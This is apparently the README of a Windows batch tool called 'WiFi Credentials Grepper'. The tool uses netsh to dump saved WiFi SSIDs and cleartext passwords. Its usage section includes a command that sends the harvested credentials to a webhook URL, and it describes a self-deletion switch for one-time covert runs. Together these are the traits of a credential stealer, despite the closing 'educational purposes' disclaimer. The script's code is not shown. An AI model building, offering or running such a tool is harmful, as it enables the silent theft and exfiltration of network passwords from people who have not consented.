WiFi Credentials Grepper for Windows

A simple batch script to extract and manage saved WiFi credentials on Windows.

## Features

- Exports saved WiFi profiles with passwords.
- Outputs results to a file (`grepper.txt` by default).
- Optionally uploads results to a webhook URL.
- Supports self-deletion after execution for one-time use.

## How It Works

1. The script uses `netsh wlan export profile` to fetch saved WiFi profiles.
2. Extracts SSIDs and passwords from the exported XML files.
3. Outputs the credentials to a text file (`grepper.txt`) or sends them to a webhook.
4. Cleans up temporary files after execution.

## Usage

### Default Usage

To run the script and save results to a text file:
```cmd
grepper.bat
```

### Custom Output File

To specify a custom output file:
```cmd
grepper.bat --output customfile.txt
```

### Upload to Webhook

To send the results to a webhook URL:
```cmd
grepper.bat --upload <webhook_url>
```
Replace `<webhook_url>` with the URL where you want the results to be sent.

### Enable Self-Deletion

To enable self-deletion after execution, set the following variable in the script:
```batch
set selfdelete=1
```

## Output Format

The output file (`grepper.txt`) contains the following information:
```
[!] SSID: <WiFi Network Name>
[+] Password: <WiFi Password>
[!] Hex pair: <Hex-encoded SSID>:<Hex-encoded Password>
```

## Disclaimer

This script is for educational purposes only. Use it responsibly and only on systems you own or have explicit permission to test.

## License

This project is licensed under the MIT License. See the LICENSE file for details.